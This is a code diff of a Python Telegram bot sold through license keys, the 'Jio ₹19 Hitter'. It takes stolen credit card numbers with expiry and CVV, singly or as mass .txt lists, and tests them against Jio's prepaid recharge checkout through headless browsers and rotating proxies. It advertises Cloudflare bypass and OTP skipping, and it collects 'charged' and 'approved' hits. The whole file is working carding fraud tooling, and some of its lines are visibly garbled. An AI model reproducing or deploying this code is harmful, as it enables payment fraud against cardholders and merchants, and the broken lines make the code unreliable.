@@ -402,12 +402,12 @@ async def _jio19_impl(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
                               code="PW-101", time=f"{(time.time()-start):.2f}s")
                 return result
 
-            await _human_d _elaylog(1000, 200("0)
+            await _human_delay(1000, 2000)
 
-            await _log("SearchClicking ₹19 plan", "🔍")
-           ing try:
-                plan = page Pro.locator("ceedtext=/₹\\s*19\\b",/").first
- "                await plan.wait_for(state="visible", timeout=10000)
+            await _log("Searching ₹19 plan", "🔍")
+            try:
+                plan = page.locator("text=/₹\\s*19\\b/").first
+                await plan.wait_for(state="visible", timeout=10000)
                 await plan.click()
                 await _log("₹19 plan selected", "✅")
             except PWTimeout:
@@ -418,7 +418,7 @@ async def _jio19_impl(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
 
             await _human_delay(800, 1500)
 
-            await⏳")
+            await _log("Clicking Proceed", "⏳")
             for label in ["Recharge", "Proceed", "Pay", "Continue"]:
                 try:
                     btn = page.locator(f"button:has-text('{label}')").first
@@ -623,4 +623,559 @@ async def api_jio19(req: Jio19Request):
         raise HTTPException(429, "CC limit reached")
     proxy = get_proxy()
     r = await jio19_playwright(req.cc, req.mm, req.yy, req.cvv,
-                                mobile
+                                mobile=req.mobile, proxy=proxy)
+    if req.user_id:
+        bump_live(req.user_id)
+        if r["status"] in ("charged","approved"): bump_hit()
+        elif r["status"] == "otp": bump_otp()
+    return r
+
+@api_app.get("/")
+async def api_root():
+    return {"status": "ok", "bot": BOT_NAME, "owner": OWNER_HANDLE}
+
+# ═══════════════════════════════════════════════════════════
+# UI HELPERS
+# ═══════════════════════════════════════════════════════════
+def fmt_time(s):
+    m, sec = divmod(int(s), 60)
+    return f"{m}m {sec}s" if m else f"{sec}s"
+
+def main_menu_kb(uid):
+    rows = [
+        [InlineKeyboardButton("📱 Jio ₹19 Hitter", callback_data="ui_jio19")],
+        [InlineKeyboardButton("📂 Mass Check (.txt)", callback_data="ui_chk"),
+         InlineKeyboardButton("📊 Live Stats", callback_data="ui_stats")],
+        [InlineKeyboardButton("💎 My Account", callback_data="ui_info"),
+         InlineKeyboardButton("🔑 Redeem Key", callback_data="ui_redeem")],
+        [InlineKeyboardButton("💬 Feedback", callback_data="ui_fb"),
+         InlineKeyboardButton("📖 Help", callback_data="ui_help")],
+    ]
+    if uid == OWNER_ID or is_admin(uid):
+        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="ui_admin")])
+    return InlineKeyboardMarkup(rows)
+
+def admin_menu_kb():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔑 Gen Key", callback_data="ad_genkey"),
+         InlineKeyboardButton("📊 Bot Stats", callback_data="ad_stats")],
+        [InlineKeyboardButton("👥 Users", callback_data="ad_users"),
+         InlineKeyboardButton("📩 Feedback", callback_data="ad_fb")],
+        [InlineKeyboardButton("⬅️ Back", callback_data="ui_main")],
+    ])
+
+def back_kb(target="ui_main", label="⬅️ Back"):
+    return InlineKeyboardMarkup([[InlineKeyboardButton(label, callback_data=target)]])
+
+def user_card(u, uid):
+    live = u["live_checks"] if u else 0
+    life = u["lifetime"] if u else 0
+    kd = key_days_left(uid); cl = cc_limit_left(uid); k = get_active_key(uid)
+    used = k["cc_used"] if k else 0; lim = k["cc_limit"] if k else 0
+    role = u['role'] if u else 'guest'
+    role_emoji = {"owner": "👑", "admin": "⭐", "user": "👤"}.get(role, "👤")
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║  💎 **{BOT_NAME}** — PROFILE\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  {role_emoji} Role    · `{role.upper()}`\n"
+        f"║  🆔 ID      · `{uid}`\n"
+        f"║  ⚡ Live    · `{live}`\n"
+        f"║  📊 Lifetime· `{life}`\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  🔑 Key     · `{kd}` day(s)\n"
+        f"║  💳 CC Used · `{used}/{lim}`\n"
+        f"║  🎯 Left    · `{cl}`\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  🤖 Bot Life· `{bot_days_left()}` day(s)\n"
+        f"╚══════════════════════════════════╝"
+    )
+
+def welcome_text(u, uid):
+    name = u.first_name if u else "User"
+    username = f"@{u.username}" if u and u.username else "—"
+    role = "OWNER" if uid == OWNER_ID else ("ADMIN" if is_admin(uid) else "USER")
+    role_emoji = {"OWNER": "👑", "ADMIN": "⭐", "USER": "👤"}[role]
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║                                  ║\n"
+        f"║   📱 **JIO ₹19 HITTER** 💎        ║\n"
+        f"║                                  ║\n"
+        f"║   ⚡ **PREMIUM EDITION** ⚡       ║\n"
+        f"║                                  ║\n"
+        f"╚══════════════════════════════════╝\n\n"
+        f"👋 **Welcome, {name}!**\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔐 **Access Required**\n"
+        f"Contact → {OWNER_HANDLE}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📊 **Your Info**\n"
+        f"  {role_emoji} Role  · `{role}`\n"
+        f"  🆔 ID    · `{uid}`\n"
+        f"  👤 User  · {username}\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 **Features**\n"
+        f"  ✅ Live inline step logs\n"
+        f"  ✅ Cloudflare bypass\n"
+        f"  ✅ Auto OTP skip\n"
+        f"  ✅ Mass .txt checking\n"
+        f"  ✅ Real-time progress\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🚀 **Ready to start?**\n"
+        f"Tap below to begin checking 💎"
+    )
+
+def jio19_text():
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║   📱 **JIO ₹19 HITTER** 💎        ║\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  💰 Amount  · `₹{PLAN_PRICE}`\n"
+        f"║  📅 Days    · `1 day`\n"
+        f"║  📶 Data    · `1GB total`\n"
+        f"║  🎯 Gate    · `Jio Prepaid`\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  ✅ Live inline logs\n"
+        f"║  ✅ Cloudflare bypass\n"
+        f"║  ✅ Auto OTP skip\n"
+        f"╚══════════════════════════════════╝\n\n"
+        f"📝 **How to use:**\n"
+        f"`/jio cc|mm|yy|cvv [mobile]`\n\n"
+        f"💡 **Example:**\n"
+        f"`/jio 4111111111111111|12|25|123 9876543210`\n\n"
+        f"🚀 Ya seedha card bhej do 💎"
+    )
+
+def chk_text():
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║   📂 **MASS CHECK** 💎            ║\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  📄 Format  · `.txt` file\n"
+        f"║  📝 Pattern · `cc|mm|yy|cvv`\n"
+        f"║  🎯 Gate    · `Jio ₹19`\n"
+        f"║  ⚡ Live    · `per-card logs`\n"
+        f"╚══════════════════════════════════╝\n\n"
+        f"📝 **How to use:**\n"
+        f"1️⃣ `.txt` file bhejo cards ke saath\n"
+        f"2️⃣ File pe **reply** karo `/chk`\n"
+        f"3️⃣ Ya file caption me `/chk` likho\n\n"
+        f"📋 **File format:**\n"
+        f"```\n"
+        f"4111111111111111|12|25|123\n"
+        f"5555555555554444|01|26|456\n"
+        f"```\n\n"
+        f"🚀 Bot automatically mass check shuru karega 💎"
+    )
+
+def help_text():
+    return (
+        f"╔══════════════════════════════════╗\n"
+        f"║   📖 **HELP — COMMANDS** 💎       ║\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  🎯 **USER COMMANDS**\n"
+        f"║  ▸ `/start` — Main menu\n"
+        f"║  ▸ `/menu` — Menu\n"
+        f"║  ▸ `/jio` — Single check\n"
+        f"║  ▸ `/chk` — Mass check\n"
+        f"║  ▸ `/redeem` — Activate key\n"
+        f"║  ▸ `/myinfo` — Profile\n"
+        f"║  ▸ `/feedback` — Send msg\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  👑 **ADMIN**\n"
+        f"║  ▸ `/genkey` — Generate key\n"
+        f"║  ▸ `/ban` `/unban`\n"
+        f"║  ▸ `/botstats` — Stats\n"
+        f"║  ▸ `/users` — User list\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  💎 **{OWNER_HANDLE}**\n"
+        f"╚══════════════════════════════════╝"
+    )
+
+# ═══════════════════════════════════════════════════════════
+# COMMANDS
+# ═══════════════════════════════════════════════════════════
+async def cmd_start(update, ctx):
+    u = update.effective_user
+    ensure_user(u.id, u.username or "")
+    if is_banned(u.id):
+        await update.message.reply_text("🚫 **You are banned.**", parse_mode="Markdown")
+        return
+    await update.message.reply_text(
+        welcome_text(u, u.id),
+        parse_mode="Markdown",
+        reply_markup=main_menu_kb(u.id),
+        disable_web_page_preview=True,
+    )
+
+async def cmd_menu(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    await update.message.reply_text(
+        f"💎 **{BOT_NAME} — MAIN MENU**",
+        parse_mode="Markdown",
+        reply_markup=main_menu_kb(u.id),
+    )
+
+async def cmd_help(update, ctx):
+    await update.message.reply_text(
+        help_text(), parse_mode="Markdown", reply_markup=back_kb())
+
+async def cmd_myinfo(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    await update.message.reply_text(
+        user_card(get_user(u.id), u.id),
+        parse_mode="Markdown", reply_markup=back_kb())
+
+async def cmd_redeem(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    if is_banned(u.id): await update.message.reply_text("🚫"); return
+    if not ctx.args:
+        await update.message.reply_text("⚠️ `/redeem KEY`", parse_mode="Markdown"); return
+    ok, m = redeem_key(u.id, ctx.args[0].strip())
+    await update.message.reply_text(m, parse_mode="Markdown")
+
+async def cmd_feedback(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    if not ctx.args:
+        await update.message.reply_text("⚠️ `/feedback msg`"); return
+    msg = " ".join(ctx.args)
+    con = db(); cur = con.cursor()
+    cur.execute("INSERT INTO feedback (user_id,username,message,created_at) VALUES (?,?,?,?)",
+        (u.id, u.username or u.first_name, msg, int(time.time())))
+    con.commit(); con.close()
+    await update.message.reply_text("✅ Feedback sent 💎")
+    try:
+        await ctx.bot.send_message(OWNER_ID,
+            f"📩 **Feedback**\n👤 `{u.id}` @{u.username or u.first_name}\n💬 {msg}",
+            parse_mode="Markdown")
+    except Exception: pass
+
+def _parse_card_args(args):
+    if not args: return None
+    rest = " ".join(args); cp = None
+    for sep in ["|","/"," "]:
+        p = rest.split(sep)
+        if len(p) >= 4: cp = p; break
+    if not cp: return None
+    mobile = cp[4].strip() if len(cp) >= 5 else ""
+    return cp[0], cp[1], cp[2], cp[3], mobile
+
+async def cmd_jio(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    if is_banned(u.id): await update.message.reply_text("🚫"); return
+    if not ctx.args:
+        await update.message.reply_text(jio19_text(), parse_mode="Markdown",
+            reply_markup=back_kb()); return
+    if not has_access(u.id):
+        await update.message.reply_text("🔑 No key. Contact " + OWNER_HANDLE); return
+    parsed = _parse_card_args(ctx.args)
+    if not parsed:
+        await update.message.reply_text("⚠️ `/jio cc|mm|yy|cvv [mobile]`"); return
+    if not consume_cc(u.id):
+        await update.message.reply_text("💳 CC limit reached."); return
+    cc, mm, yy, cvv, mobile = parsed
+    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
+    proxy = get_proxy() or "direct"
+    proxy_disp = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
+    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=18)
+    await live.log("Starting check", "🚀")
+    r = await jio19_playwright(cc, mm, yy, cvv, mobile=mobile, proxy=proxy, log_cb=live.log)
+    bump_live(u.id)
+    if r["status"] in ("charged","approved"): bump_hit()
+    elif r["status"] == "otp": bump_otp()
+    elif r["status"] == "error": refund_cc(u.id)
+    await live.finish(r["status"], r["response"], r["code"])
+
+def parse_lines(lines):
+    cards = []
+    for line in lines:
+        line = line.strip()
+        if not line: continue
+        for sep in ["|","/"," "]:
+            p = line.split(sep)
+            if len(p) >= 4: cards.append((p[0],p[1],p[2],p[3])); break
+    return cards
+
+async def cmd_chk(update, ctx):
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    if is_banned(u.id): await update.message.reply_text("🚫"); return
+    if not has_access(u.id):
+        await update.message.reply_text("🔑 No key."); return
+    doc = update.message.document or (update.message.reply_to_message and update.message.reply_to_message.document)
+    if not doc:
+        await update.message.reply_text(chk_text(), parse_mode="Markdown"); return
+    status = await update.message.reply_text("📂 Loading...")
+    try:
+        f = await ctx.bot.get_file(doc.file_id)
+        lines = (await f.download_as_bytearray()).decode("utf-8", errors="ignore").splitlines()
+        cards = parse_lines(lines)
+    except Exception as e:
+        await status.edit_text(f"⚠️ {e}"); return
+    if not cards:
+        await status.edit_text("⚠️ No cards."); return
+    await status.delete()
+    total = len(cards); start = time.time()
+    counts = {"approved":0,"charged":0,"declined":0,"dead":0,"otp":0,"error":0,"limit":0}
+    hits = []
+    header = await update.message.reply_text(
+        f"```\n╔══════════════════════════════════╗\n"
+        f"║  🚀 MASS CHECK STARTED 💎\n"
+        f"╠══════════════════════════════════╣split\n"
+        f"║  📊 Total · {("total}\n"
+        f"║  📱 Gate  · Jio ₹19\n"
+        f"╚══════════════════════════════════╝\n```",
+        parse_mode="Markdown")
+    for idx, (cc,mm,yy,cvv) in enumerate(cards, 1):
+        masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
+        if not consume_cc(u.id): counts["limit"] += 1; continue
+        proxy = get_proxy() or "direct"
+        proxy_disp = proxy.split("@")[-1].://")[-1] if proxy else "direct"
+        live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=10)
+        await live.log(f"Card {idx}/{total}", "🚀")
+        r = await jio19_playwright(cc, mm, yy, cvv, proxy=proxy, log_cb=live.log)
+        bump_live(u.id); st = r["status"]; counts[st] = counts.get(st,0)+1
+        if st == "otp":
+            bump_otp(); await live.finish("otp", r["response"], r["code"])
+            await asyncio.sleep(0.5); continue
+        if st in ("charged","approved"):
+            bump_hit(); hits.append(f"{cc}|{mm}|{yy}|{cvv} — {st.upper()}")
+        elif st == "error":
+            refund_cc(u.id)
+        await live.finish(st, r["response"], r["code"])
+        await asyncio.sleep(0.5)
+    summary = (
+        f"```\n"
+        f"╔══════════════════════════════════╗\n"
+        f"║  🏁 MASS DONE 💎\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  📊 Total · {total}\n"
+        f"║  🕒 Time  · {fmt_time(time.time()-start)}\n"
+        f"╠══════════════════════════════════╣\n"
+        f"║  💎 {counts['charged']} ✅ {counts['approved']} ❌ {counts['declined']}\n"
+        f"║  ☠️ {counts['dead']} 🔐 {counts['otp']} ⚠️ {counts['error']}\n"
+        f"║  ⛔ Limit · {counts['limit']}\n"
+        f"╚══════════════════════════════════╝\n```"
+    )
+    await header.edit_text(summary, parse_mode="Markdown")
+    if hits:
+        hit_text = "\n".join(hits)
+        await update.message.reply_text(
+            f"💎 **{len(hits)} HITS**\n\n```\n{hit_text[:3500]}\n```",
+            parse_mode="Markdown")
+
+# ═══════════════════════════════════════════════════════════
+# ADMIN
+# ═══════════════════════════════════════════════════════════
+async def cmd_genkey(update, ctx):
+    u = update.effective_user
+    if not is_admin(u.id): await update.message.reply_text("🚫"); return
+    if len(ctx.args) < 3:
+        await update.message.reply_text("⚠️ `/genkey <days> <uses> <cc_limit>`",
+            parse_mode="Markdown"); return
+    try: d,n,cl = int(ctx.args[0]),int(ctx.args[1]),int(ctx.args[2])
+    except Exception: await update.message.reply_text("⚠️ ints only"); return
+    k = gen_key(d,n,cl,u.id)
+    await update.message.reply_text(
+        f"🔑 **Key** 💎\n`{k}`\n▸ days `{d}` · uses `{n}` · cc `{cl}`",
+        parse_mode="Markdown")
+
+async def cmd_ban(update, ctx):
+    u = update.effective_user
+    if not is_admin(u.id): await update.message.reply_text("🚫"); return
+    t = None
+    if update.message.reply_to_message: t = update.message.reply_to_message.from_user.id
+    elif ctx.args:
+        try: t = int(ctx.args[0])
+        except Exception: pass
+    if not t: await update.message.reply_text("⚠️ reply or id"); return
+    if is_owner(t): await update.message.reply_text("🚫"); return
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (t,)); con.commit(); con.close()
+    await update.message.reply_text(f"🚫 `{t}`", parse_mode="Markdown")
+
+async def cmd_unban(update, ctx):
+    u = update.effective_user
+    if not is_admin(u.id): await update.message.reply_text("🚫"); return
+    t = None
+    if update.message.reply_to_message: t = update.message.reply_to_message.from_user.id
+    elif ctx.args:
+        try: t = int(ctx.args[0])
+        except Exception: pass
+    if not t: await update.message.reply_text("⚠️ reply or id"); return
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (t,)); con.commit(); con.close()
+    await update.message.reply_text(f"✅ `{t}`", parse_mode="Markdown")
+
+async def cmd_botstats(update, ctx):
+    u = update.effective_user
+    if not is_admin(u.id): await update.message.reply_text("🚫"); return
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
+    tc,th,jio,otp = cur.fetchone()
+    cur.execute("SELECT COUNT(*) FROM users"); uc = cur.fetchone()[0]
+    cur.execute("SELECT COUNT(*) FROM users WHERE banned=1"); bc = cur.fetchone()[0]
+    con.close()
+    await update.message.reply_text(
+        f"📊 **BOT STATS** 💎\n━━━━━━━━━━━━━━━━━\n"
+        f"👥 Users · `{uc}` 🚫 `{bc}`\n"
+        f"⚡ Total · `{tc}` 💎 `{th}`\n"
+        f"📱 Jio   · `{jio}` 🔐 OTP `{otp}`\n"
+        f"🤖 Bot   · `{bot_days_left()}`d",
+        parse_mode="Markdown")
+
+async def cmd_users(update, ctx):
+    u = update.effective_user
+    if not is_admin(u.id): await update.message.reply_text("🚫"); return
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT user_id,username,banned,role,live_checks,lifetime FROM users ORDER BY first_seen DESC LIMIT 20")
+    rows = cur.fetchall(); con.close()
+    out = ["👥 **Recent Users** 💎","━━━━━━━━━━━━━━━━━"]
+    for uid,un,bn,rl,lv,lf in rows:
+        mark = "🚫" if bn else ("👑" if rl=="owner" else ("⭐" if rl=="admin" else "👤"))
+        out.append(f"{mark} `{uid}` @{un or '-'} · L`{lv}` T`{lf}`")
+    await update.message.reply_text("\n".join(out), parse_mode="Markdown")
+
+async def cmd_feedbacklist(update, ctx):
+    u = update.effective_user
+    if not is_owner(u.id): await update.message.reply_text("🚫"); return
+    con = db(); cur = con.cursor()
+    cur.execute("SELECT user_id,username,message,created_at FROM feedback ORDER BY id DESC LIMIT 10")
+    rows = cur.fetchall(); con.close()
+    if not rows: await update.message.reply_text("📭 Empty."); return
+    out = ["📩 **Last 10 Feedback** 💎","━━━━━━━━━━━━━━━━━"]
+    for uid,un,m,ts in rows:
+        out.append(f"👤 `{uid}` @{un}\n💬 {m}\n🕒 {datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M')}")
+        out.append("━━━━━━━━━━━━━━━━━")
+    await update.message.reply_text("\n".join(out), parse_mode="Markdown")
+
+# ═══════════════════════════════════════════════════════════
+# CALLBACKS
+# ═══════════════════════════════════════════════════════════
+async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    d = q.data; uid = q.from_user.id
+    ensure_user(uid, q.from_user.username or "")
+
+    if d == "ui_main":
+        await q.edit_message_text(f"💎 **{BOT_NAME} — MAIN MENU**",
+            parse_mode="Markdown", reply_markup=main_menu_kb(uid))
+    elif d == "ui_info":
+        await q.edit_message_text(user_card(get_user(uid), uid),
+            parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_jio19":
+        await q.edit_message_text(jio19_text(), parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_chk":
+        await q.edit_message_text(chk_text(), parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_help":
+        await q.edit_message_text(help_text(), parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_redeem":
+        await q.edit_message_text(f"🔑 **REDEEM**\n\n`/redeem YOUR-KEY`",
+            parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_fb":
+        await q.edit_message_text(f"💬 **FEEDBACK**\n\n`/feedback msg`",
+            parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_stats":
+        con = db(); cur = con.cursor()
+        cur.execute("SELECT total_checks,total_hits,jio_checks,otp_count FROM stats WHERE id=1")
+        tc,th,jio,otp = cur.fetchone(); con.close()
+        u = get_user(uid)
+        await q.edit_message_text(
+            f"📊 **Stats** 💎\n━━━━━━━━━━━━━━━━━\n"
+            f"👤 Your Live · `{u['live_checks'] if u else 0}`\n"
+            f"📊 Your Life · `{u['lifetime'] if u else 0}`\n"
+            f"⚡ Bot Total · `{tc}`\n"
+            f"💎 Hits      · `{th}`\n"
+            f"📱 Jio       · `{jio}`\n"
+            f"🔐 OTP       · `{otp}`\n"
+            f"🤖 Bot Life  · `{bot_days_left()}`d",
+            parse_mode="Markdown", reply_markup=back_kb())
+    elif d == "ui_admin":
+        if uid != OWNER_ID and not is_admin(uid):
+            await q.answer("Not allowed", show_alert=True); return
+        await q.edit_message_text(f"👑 **ADMIN PANEL**\n\nWelcome, Boss 💎",
+            parse_mode="Markdown", reply_markup=admin_menu_kb())
+    elif d == "ad_genkey":
+        await q.edit_message_text(
+            f"🔑 `/genkey <days> <uses> <cc_limit>`\n\nExample:\n`/genkey 30 10 100`",
+            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
+    elif d == "ad_stats":
+        await q.edit_message_text("📊 Use `/botstats`",
+            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
+    elif d == "ad_users":
+        await q.edit_message_text("👥 Use `/users`",
+            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
+    elif d == "ad_fb":
+        await q.edit_message_text("📩 Use `/feedbacklist`",
+            parse_mode="Markdown", reply_markup=back_kb("ui_admin"))
+
+# ═══════════════════════════════════════════════════════════
+# GENERIC MESSAGE
+# ═══════════════════════════════════════════════════════════
+async def on_message(update, ctx):
+    if not update.message or not update.message.text: return
+    if update.message.text.startswith("/"): return
+    u = update.effective_user; ensure_user(u.id, u.username or "")
+    if is_banned(u.id): return
+    if not has_access(u.id): return
+    raw = update.message.text.strip(); cp = None
+    for sep in ["|","/"," "]:
+        p = raw.split(sep)
+        if len(p) >= 4: cp = p; break
+    if not cp: return
+    if not consume_cc(u.id):
+        await update.message.reply_text("💳 Limit."); return
+    cc,mm,yy,cvv = cp[0],cp[1],cp[2],cp[3]
+    masked = f"{cc[:6]}XXXXXX{cc[-4:]}"
+    proxy = get_proxy() or "direct"
+    proxy_disp = proxy.split("@")[-1].split("://")[-1] if proxy else "direct"
+    live = LiveLogger(ctx.bot, update.effective_chat.id, masked, proxy_disp, max_lines=18)
+    await live.log("Starting", "🚀")
+    r = await jio19_playwright(cc,mm,yy,cvv, proxy=proxy, log_cb=live.log)
+    bump_live(u.id)
+    if r["status"] in ("charged","approved"): bump_hit()
+    elif r["status"] == "otp": bump_otp()
+    elif r["status"] == "error": refund_cc(u.id)
+    await live.finish(r["status"], r["response"], r["code"])
+
+# ═══════════════════════════════════════════════════════════
+# BOOT
+# ═══════════════════════════════════════════════════════════
+def run_api():
+    uvicorn.run(api_app, host="0.0.0.0", port=PORT, log_level="warning")
+
+def main():
+    db_init()
+    ensure_user(OWNER_ID, "whoh4rsh")
+    con = db(); cur = con.cursor()
+    cur.execute("UPDATE users SET role='owner' WHERE user_id=?", (OWNER_ID,))
+    con.commit(); con.close()
+
+    logger.info(f"🔍 Browser path: {get_browser_path()}")
+    logger.info(f"🔍 HEADLESS: {HEADLESS}")
+    logger.info(f"🔍 PORT: {PORT}")
+
+    Thread(target=run_api, daemon=True).start()
+
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("menu", cmd_menu))
+    app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("myinfo", cmd_myinfo))
+    app.add_handler(CommandHandler("redeem", cmd_redeem))
+    app.add_handler(CommandHandler("feedback", cmd_feedback))
+    app.add_handler(CommandHandler("jio", cmd_jio))
+    app.add_handler(CommandHandler("chk", cmd_chk))
+    app.add_handler(CommandHandler("genkey", cmd_genkey))
+    app.add_handler(CommandHandler("ban", cmd_ban))
+    app.add_handler(CommandHandler("unban", cmd_unban))
+    app.add_handler(CommandHandler("botstats", cmd_botstats))
+    app.add_handler(CommandHandler("users", cmd_users))
+    app.add_handler(CommandHandler("feedbacklist", cmd_feedbacklist))
+    app.add_handler(CallbackQueryHandler(on_callback))
+    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), on_message))
+
+    logger.info(f"🚀 {BOT_NAME} starting (Railway)...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
